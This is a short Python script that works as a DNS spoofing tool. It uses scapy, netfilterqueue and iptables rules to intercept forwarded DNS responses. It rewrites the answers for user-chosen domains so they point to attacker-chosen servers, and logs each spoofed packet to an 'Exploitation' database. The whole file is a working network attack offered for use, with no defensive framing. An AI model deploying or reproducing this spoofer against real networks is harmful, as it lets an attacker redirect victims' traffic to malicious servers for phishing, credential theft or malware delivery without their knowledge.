from scapy.all import *
from netfilterqueue import NetfilterQueue #apt-get install libnetfilter-queue-dev and pip install netfilterqueue
import sqlite3

conn = sqlite3.connect("Exploitation.db")
cur = conn.cursor()

dns_hosts = {}
while True:
    source = input("Enter source website (or 'q' to quit): ")
    if source.lower() == 'q':
        break
    source = source + "."
    source = source.encode('utf-8')
    destination = input("Destination web server: ")
    dns_hosts[source] = destination

def modify_packet(packet):
    qname = packet[DNSQR].qname
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        if scapy_packet[DNSQR].qname in dns_hosts:
            dlist = [str(scapy_packet[DNSQR].qname), dns_hosts[scapy_packet[DNSQR].qname]]
            print("[Before]:", scapy_packet.summary())
            dlist.append(scapy_packet.summary())
            try:
                scapy_packet = modify_packet(scapy_packet)
            except IndexError:
                pass
            print("[After ]:", scapy_packet.summary())
            dlist.append(scapy_packet.summary())
            cur.execute('''INSERT INTO DNS_Spoofing (id, Source, Destination, Before, After) 
            VALUES (NULL, ?, ?, ?, ?)
             ''', dlist)
            conn.commit()
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    
    
QUEUE_NUM = 0
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM), shell=True)
subprocess.call("iptables -A FORWARD -p UDP --dport 53 -j DROP", shell=True)
queue = NetfilterQueue()
    
print(dns_hosts)
print("Spoofing DNS...")
try:
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")